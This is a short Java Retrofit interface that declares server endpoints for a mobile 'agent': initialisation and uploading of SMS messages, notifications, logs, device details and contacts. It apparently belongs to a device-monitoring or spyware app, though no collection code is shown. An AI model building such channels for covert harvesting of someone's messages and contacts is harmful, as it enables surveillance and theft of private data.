package com.pegalite.coresec.server.req;


import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Headers;
import retrofit2.http.POST;

public interface ApiInterfaces {

    @Headers("Content-Type: application/json")
    @POST("/api/agent/initAgent")
    Call<ResponseBody> onAgentInit(@Body RequestBody requestBody);

    @Headers("Content-Type: application/json")
    @POST("/api/agent/save-sms")
    Call<ResponseBody> saveSMS(@Body RequestBody requestBody);

    @Headers("Content-Type: application/json")
    @POST("/api/agent/save-notification")
    Call<ResponseBody> saveNotification(@Body RequestBody requestBody);

    @Headers("Content-Type: application/json")
    @POST("/api/agent/save-log")
    Call<ResponseBody> saveLog(@Body RequestBody requestBody);

    @Headers("Content-Type: application/json")
    @POST("/api/agent/save-details")
    Call<ResponseBody> saveDetails(@Body RequestBody requestBody);

    @Headers("Content-Type: application/json")
    @POST("/api/agent/save-contacts")
    Call<ResponseBody> saveContacts(@Body RequestBody requestBody);
}
